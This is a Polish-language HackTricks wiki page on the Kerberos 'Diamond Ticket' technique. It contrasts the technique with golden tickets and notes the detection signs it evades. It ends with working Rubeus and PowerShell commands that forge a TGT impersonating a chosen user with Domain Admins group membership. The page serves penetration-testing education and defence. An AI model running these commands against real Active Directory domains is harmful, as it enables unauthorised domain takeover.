# Diamond Ticket

{{#include ../../banners/hacktricks-training.md}}

## Diamond Ticket

**Jak złoty bilet**, diamentowy bilet to TGT, który może być użyty do **dostępu do dowolnej usługi jako dowolny użytkownik**. Złoty bilet jest fałszowany całkowicie offline, szyfrowany hashem krbtgt tej domeny, a następnie przekazywany do sesji logowania do użycia. Ponieważ kontrolery domeny nie śledzą TGT, które (lub które) zostały legalnie wydane, chętnie akceptują TGT, które są szyfrowane ich własnym hashem krbtgt.

Istnieją dwie powszechne techniki wykrywania użycia złotych biletów:

- Szukaj TGS-REQ, które nie mają odpowiadającego AS-REQ.
- Szukaj TGT, które mają absurdalne wartości, takie jak domyślna 10-letnia żywotność Mimikatz.

**Diamentowy bilet** jest tworzony przez **modyfikację pól legalnego TGT, które zostało wydane przez DC**. Osiąga się to poprzez **zażądanie** **TGT**, **odszyfrowanie** go hashem krbtgt domeny, **zmodyfikowanie** pożądanych pól biletu, a następnie **ponowne zaszyfrowanie** go. To **przezwycięża dwa wcześniej wspomniane niedociągnięcia** złotego biletu, ponieważ:

- TGS-REQ będą miały poprzedzający AS-REQ.
- TGT zostało wydane przez DC, co oznacza, że będzie miało wszystkie poprawne szczegóły z polityki Kerberos domeny. Chociaż te mogą być dokładnie fałszowane w złotym bilecie, jest to bardziej skomplikowane i podatne na błędy.
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
{{#include ../../banners/hacktricks-training.md}}
